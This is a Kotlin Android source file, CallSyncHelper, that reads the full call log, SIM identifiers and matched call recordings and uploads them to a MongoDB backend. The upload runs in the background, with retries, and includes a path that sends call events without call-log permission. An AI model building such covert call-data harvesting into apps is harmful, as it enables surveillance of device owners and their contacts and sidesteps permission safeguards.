package com.calltech

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.provider.CallLog
import android.telephony.SubscriptionManager
import android.util.Log
import androidx.core.content.ContextCompat
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

object CallSyncHelper {
    private const val TAG = "CallSyncHelper"
    private const val PREFS = "calltech_sync"
    private const val SYNC_DELAY_MS = 400L
    private const val SYNC_ALL = 0
    private const val RECENT_CALL_LIMIT = 500
    private const val RECORDING_MATCH_WINDOW_MS = 120_000L

    private data class CallEntry(
        val number: String,
        val name: String,
        val type: Int,
        val date: Long,
        val duration: Long,
        val callType: String,
        val docId: String,
        val subscriptionId: Int?,
    )

    fun syncLatestCalls(
        context: Context,
        source: String = "background",
        recording: RecordingMeta? = null,
        retryCount: Int = 1,
        onComplete: (() -> Unit)? = null,
    ) {
        val delayMs = if (source.startsWith("kill_state")) 800L else SYNC_DELAY_MS

        BackgroundSyncRunner.runDelayed(delayMs) {
            MongoSyncHelper.ensureApiUrl(context)
            syncLatestCallsInternal(
                context = context.applicationContext,
                source = source,
                recording = recording,
                onComplete = onComplete,
                retryCount = retryCount,
            )
        }
    }

    @Deprecated("Use syncLatestCalls")
    fun syncRecentCalls(
        context: Context,
        source: String = "background",
        recording: RecordingMeta? = null,
        onComplete: (() -> Unit)? = null,
    ) {
        syncLatestCalls(context, source, recording, onComplete = onComplete)
    }

    private fun syncLatestCallsInternal(
        context: Context,
        source: String,
        recording: RecordingMeta?,
        onComplete: (() -> Unit)?,
        retryCount: Int = 0,
    ) {
        if (!hasCallLogPermission(context)) {
            Log.w(TAG, "READ_CALL_LOG permission missing — call sync queued")
            PendingCallSync.markPending(context)
            onComplete?.invoke()
            return
        }

        SimNumberHelper.ensureSimReadyForSync(context)

        try {
            val prefs = context.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            val entries = readLatestCallEntries(context, SYNC_ALL)

            if (entries.isEmpty()) {
                recording?.file?.delete()
                onComplete?.invoke()
                return
            }

            val lastSync = prefs.getLong("last_sync_timestamp", 0L)
            val recordingTarget = findRecordingTarget(entries, recording)
            val recent = entries.take(RECENT_CALL_LIMIT)
            val newer = entries.filter { it.date >= lastSync }
            val toSync = (recent + newer).distinctBy { it.docId }

            if (toSync.isEmpty()) {
                if (retryCount > 0) {
                    Log.d(TAG, "No new calls yet, retrying in 2s...")
                    BackgroundSyncRunner.runDelayed(2000L) {
                        syncLatestCallsInternal(
                            context = context,
                            source = source,
                            recording = recording,
                            onComplete = onComplete,
                            retryCount = retryCount - 1,
                        )
                    }
                    return
                }

                recording?.file?.delete()
                onComplete?.invoke()
                return
            }

            val payload = toSync.map { entry ->
                val shouldAttachRecording = recordingTarget?.docId == entry.docId
                buildCallMap(
                    context = context,
                    entry = entry,
                    source = source,
                    recording = if (shouldAttachRecording) recording else null,
                    recordingUrl = if (shouldAttachRecording) "" else null,
                )
            }

            val success = MongoSyncHelper.syncCallLogsNow(context, payload)
            if (success) {
                payload.forEach { call ->
                    call["id"]?.toString()?.let { LocalDataStore.markCallSynced(context, it) }
                }
                val maxTimestamp = toSync.maxOf { it.date }
                finishSync(prefs, maxTimestamp, onComplete)
                MessageEventEmitter.notifyNewCallSafe()
                Log.d(TAG, "Synced ${payload.size} calls to MongoDB from $source")
            } else {
                payload.forEach { PendingCallQueue.enqueue(context, it) }
                Log.e(TAG, "Call batch Mongo sync FAILED: ${payload.size} from $source")
                if (retryCount > 0) {
                    BackgroundSyncRunner.runDelayed(2500L) {
                        syncLatestCallsInternal(
                            context = context,
                            source = source,
                            recording = recording,
                            onComplete = onComplete,
                            retryCount = retryCount - 1,
                        )
                    }
                    return
                }
                onComplete?.invoke()
            }

            if (recordingTarget == null) {
                recording?.file?.delete()
            }
        } catch (error: Exception) {
            Log.e(TAG, "syncLatestCalls failed", error)
            recording?.file?.delete()
            onComplete?.invoke()
        }
    }

    private fun readLatestCallEntries(context: Context, limit: Int): List<CallEntry> {
        val uri: Uri = CallLog.Calls.CONTENT_URI
        val cursor = context.contentResolver.query(
            uri,
            null,
            null,
            null,
            "${CallLog.Calls.DATE} DESC",
        ) ?: return emptyList()

        val entries = mutableListOf<CallEntry>()

        cursor.use { row ->
            if (!row.moveToFirst()) {
                return emptyList()
            }

            do {
                val number =
                    (row.getString(row.getColumnIndexOrThrow(CallLog.Calls.NUMBER)) ?: "")
                        .ifBlank { "Unknown" }
                val name =
                    row.getString(row.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME))
                        ?: "Unknown"
                val type = row.getInt(row.getColumnIndexOrThrow(CallLog.Calls.TYPE))
                val date = row.getLong(row.getColumnIndexOrThrow(CallLog.Calls.DATE))
                val duration = row.getLong(row.getColumnIndexOrThrow(CallLog.Calls.DURATION))
                val callType = mapCallType(type)
                val logIdIndex = row.getColumnIndex(CallLog.Calls._ID)
                val logId = if (logIdIndex >= 0) row.getLong(logIdIndex) else date
                val docId = "call_$logId"
                val subscriptionId = readCallSubscriptionId(context, row)
                val addressIndex = row.getColumnIndex("phone_account_address")
                if (addressIndex >= 0) {
                    SimNumberHelper.noteDiscoveredNumber(
                        context,
                        subscriptionId,
                        row.getString(addressIndex) ?: "",
                    )
                }

                entries.add(
                    CallEntry(
                        number = number,
                        name = name,
                        type = type,
                        date = date,
                        duration = duration,
                        callType = callType,
                        docId = docId,
                        subscriptionId = subscriptionId,
                    ),
                )
            } while (row.moveToNext() && (limit <= 0 || entries.size < limit))
        }

        return entries
    }

    private fun findRecordingTarget(
        entries: List<CallEntry>,
        recording: RecordingMeta?,
    ): CallEntry? {
        if (recording == null) {
            return null
        }

        return entries
            .filter { it.duration > 0 }
            .minByOrNull { kotlin.math.abs(it.date - recording.startedAt) }
            ?.takeIf {
                kotlin.math.abs(it.date - recording.startedAt) <= RECORDING_MATCH_WINDOW_MS
            }
    }

    private fun mapCallType(type: Int): String {
        return when (type) {
            CallLog.Calls.INCOMING_TYPE -> "INCOMING"
            CallLog.Calls.OUTGOING_TYPE -> "OUTGOING"
            CallLog.Calls.MISSED_TYPE -> "MISSED"
            CallLog.Calls.REJECTED_TYPE -> "REJECTED"
            CallLog.Calls.BLOCKED_TYPE -> "BLOCKED"
            CallLog.Calls.VOICEMAIL_TYPE -> "VOICEMAIL"
            else -> "UNKNOWN"
        }
    }

    private fun getCallAction(type: String, duration: Long): String {
        return when (type) {
            "MISSED" -> "missed_call"
            "REJECTED" -> "rejected_call"
            "BLOCKED" -> "blocked_call"
            "VOICEMAIL" -> "voicemail"
            "INCOMING" -> if (duration > 0) "incoming_answered" else "incoming_not_answered"
            "OUTGOING" -> if (duration > 0) "outgoing_connected" else "outgoing_no_answer"
            else -> "unknown"
        }
    }

    private fun getCallActionLabel(action: String): String {
        return when (action) {
            "missed_call" -> "Missed call"
            "rejected_call" -> "Rejected call"
            "blocked_call" -> "Blocked call"
            "voicemail" -> "Voicemail"
            "incoming_answered" -> "Incoming · Answered"
            "incoming_not_answered" -> "Incoming · Not answered"
            "outgoing_connected" -> "Outgoing · Connected"
            "outgoing_no_answer" -> "Outgoing · No answer"
            else -> "Unknown activity"
        }
    }

    private fun buildCallMap(
        context: Context,
        entry: CallEntry,
        source: String,
        recording: RecordingMeta?,
        recordingUrl: String?,
    ): HashMap<String, Any> {
        val callAction = getCallAction(entry.callType, entry.duration)
        val hasRecording = !recordingUrl.isNullOrBlank()
        val rawSim = SimNumberHelper.getSimNumberForSubscription(context, entry.subscriptionId)
        val simNumber = if (SimNumberHelper.isRealPhoneNumber(rawSim)) {
            rawSim
        } else {
            SimNumberHelper.getBestRealSimNumber(context)
        }
        if (SimNumberHelper.isRealPhoneNumber(simNumber)) {
            SimNumberHelper.linkSubscriptionToNumber(context, entry.subscriptionId, simNumber)
        }

        val deviceId = DeviceIdHelper.getDeviceId(context)
        val eventId = entry.docId

        return hashMapOf(
            "id" to DeviceIdHelper.buildDocumentId(deviceId, eventId),
            "eventId" to eventId,
            "deviceId" to deviceId,
            "phoneNumber" to entry.number,
            "name" to entry.name,
            "contactName" to entry.name,
            "type" to entry.callType,
            "duration" to entry.duration,
            "durationSeconds" to entry.duration,
            "durationFormatted" to formatDuration(entry.duration),
            "timestamp" to entry.date,
            "dateTime" to SimpleDateFormat(
                "yyyy-MM-dd HH:mm:ss",
                Locale.getDefault(),
            ).format(Date(entry.date)),
            "rawType" to entry.type,
            "callAction" to callAction,
            "callActionLabel" to getCallActionLabel(callAction),
            "hasRecording" to hasRecording,
            "recordingUrl" to (recordingUrl ?: ""),
            "recordingDurationMs" to (recording?.durationMs ?: 0L),
            "recordingDurationFormatted" to formatDuration(
                ((recording?.durationMs ?: 0L) / 1000L),
            ),
            "simNumber" to simNumber,
            "subscriptionId" to (entry.subscriptionId ?: SubscriptionManager.INVALID_SUBSCRIPTION_ID),
            "syncedFrom" to source,
            "syncStatus" to "pending",
        )
    }

    private fun readCallSubscriptionId(context: Context, row: android.database.Cursor): Int? {
        val accountIndex = row.getColumnIndex(CallLog.Calls.PHONE_ACCOUNT_ID)
        if (accountIndex >= 0) {
            when (val raw = row.getString(accountIndex)) {
                null, "" -> Unit
                else -> {
                    raw.toIntOrNull()?.let { return it }
                    matchSubscriptionId(context, raw)?.let { return it }
                }
            }
        }

        val subIndex = row.getColumnIndex("sub_id")
        if (subIndex >= 0 && !row.isNull(subIndex)) {
            return row.getInt(subIndex)
        }

        return null
    }

    private fun matchSubscriptionId(context: Context, raw: String): Int? {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP_MR1) {
            return null
        }

        val subscriptionManager = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE)
            as? SubscriptionManager ?: return null

        subscriptionManager.activeSubscriptionInfoList?.forEach { info ->
            if (raw == info.subscriptionId.toString()) {
                return info.subscriptionId
            }
            if (raw == info.iccId) {
                return info.subscriptionId
            }
        }

        return null
    }

    private fun formatDuration(seconds: Long): String {
        val safeSeconds = seconds.coerceAtLeast(0)
        val minutes = safeSeconds / 60
        val remaining = safeSeconds % 60

        return if (minutes > 0) {
            "${minutes}m ${remaining}s"
        } else {
            "${remaining}s"
        }
    }

    private fun finishSync(
        prefs: android.content.SharedPreferences,
        maxTimestamp: Long,
        onComplete: (() -> Unit)?,
    ) {
        if (maxTimestamp > 0) {
            prefs.edit().putLong("last_sync_timestamp", maxTimestamp).apply()
        }
        onComplete?.invoke()
    }

    private fun sanitizePhone(phone: String): String {
        return phone.replace(Regex("[/.#\$\\[\\]\\+]"), "_")
    }

    fun hasCallLogPermission(context: Context): Boolean {
        return ContextCompat.checkSelfPermission(
            context,
            Manifest.permission.READ_CALL_LOG,
        ) == PackageManager.PERMISSION_GRANTED
    }

    /** Bina call log permission — call event seedha MongoDB. */
    fun syncCapturedCall(
        context: Context,
        phoneNumber: String,
        name: String?,
        type: String,
        durationSeconds: Long,
        timestamp: Long,
        source: String,
    ): Boolean {
        MongoSyncHelper.ensureApiUrl(context)
        val appContext = context.applicationContext
        SimNumberHelper.ensureSimReadyForSync(appContext)
        val simNumber = SimNumberHelper.getBestRealSimNumber(appContext)
        val phone = phoneNumber.trim().ifBlank { "Unknown" }
        val callType = type.uppercase(Locale.US)
        val duration = durationSeconds.coerceAtLeast(0)
        val callAction = getCallAction(callType, duration)
        val docId = "${sanitizePhone(phone)}_$timestamp"

        val deviceId = DeviceIdHelper.getDeviceId(appContext)
        val eventId = docId

        val data = hashMapOf<String, Any>(
            "id" to DeviceIdHelper.buildDocumentId(deviceId, eventId),
            "eventId" to eventId,
            "deviceId" to deviceId,
            "phoneNumber" to phone,
            "name" to (name?.trim()?.ifBlank { phone } ?: phone),
            "contactName" to (name?.trim()?.ifBlank { phone } ?: phone),
            "type" to callType,
            "duration" to duration,
            "durationSeconds" to duration,
            "durationFormatted" to formatDuration(duration),
            "timestamp" to timestamp,
            "dateTime" to SimpleDateFormat(
                "yyyy-MM-dd HH:mm:ss",
                Locale.getDefault(),
            ).format(Date(timestamp)),
            "rawType" to 0,
            "callAction" to callAction,
            "callActionLabel" to getCallActionLabel(callAction),
            "hasRecording" to false,
            "recordingUrl" to "",
            "recordingDurationMs" to 0L,
            "recordingDurationFormatted" to "",
            "simNumber" to simNumber,
            "syncedFrom" to source,
            "syncStatus" to "pending",
        )

        return MongoSyncHelper.syncCallLogsNow(appContext, listOf(data)).also { success ->
            if (success) {
                Log.d(TAG, "Captured call synced ($simNumber): $docId")
                data["id"]?.toString()?.let { LocalDataStore.markCallSynced(appContext, it) }
            } else {
                Log.e(TAG, "Captured call sync failed: $docId")
                PendingCallQueue.enqueue(appContext, data)
            }
        }
    }

    fun syncAllCallsToMongo(
        context: Context,
        source: String = "full_sync",
        onComplete: (() -> Unit)? = null,
    ) {
        BackgroundSyncRunner.run {
            syncAllCallsToMongoNow(context, source)
            onComplete?.invoke()
        }
    }

    fun syncAllCallsToMongoNow(
        context: Context,
        source: String = "full_sync",
    ): Boolean {
        MongoSyncHelper.ensureApiUrl(context)
        val appContext = context.applicationContext
        SimNumberHelper.ensureSimReadyForSync(appContext)

        LocalDataStore.syncPendingToMongo(appContext, source)
        PendingCallQueue.flush(appContext)

        if (!hasCallLogPermission(appContext)) {
            Log.d(TAG, "Call log permission missing — local/pending calls synced only")
            return PendingCallQueue.hasPending(appContext).not()
        }

        return try {
            val entries = readLatestCallEntries(appContext, SYNC_ALL)

            if (entries.isEmpty()) {
                return true
            }

            val payload = entries.map { entry ->
                buildCallMap(appContext, entry, source, null, null)
            }

            Log.d(TAG, "Syncing ${payload.size} recent calls to MongoDB")
            val success = MongoSyncHelper.syncCallLogsNow(appContext, payload)
            if (!success) {
                payload.forEach { PendingCallQueue.enqueue(appContext, it) }
            } else {
                val maxTimestamp = entries.maxOfOrNull { it.date } ?: 0L
                if (maxTimestamp > 0L) {
                    appContext.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                        .edit()
                        .putLong("last_sync_timestamp", maxTimestamp)
                        .apply()
                }
                payload.forEach { call ->
                    val id = call["id"]?.toString()
                    if (id != null) {
                        LocalDataStore.markCallSynced(appContext, id)
                    }
                }
            }
            Log.d(TAG, "syncAllCallsToMongo done: count=${payload.size}, success=$success")
            success
        } catch (error: Exception) {
            Log.e(TAG, "syncAllCallsToMongo failed", error)
            false
        }
    }

    fun markBackgroundSyncEnabled(context: Context, enabled: Boolean) {
        context.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            .edit()
            .putBoolean("background_sync_enabled", enabled)
            .apply()
    }

    fun isBackgroundSyncEnabled(context: Context): Boolean {
        return context.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            .getBoolean("background_sync_enabled", true)
    }
}
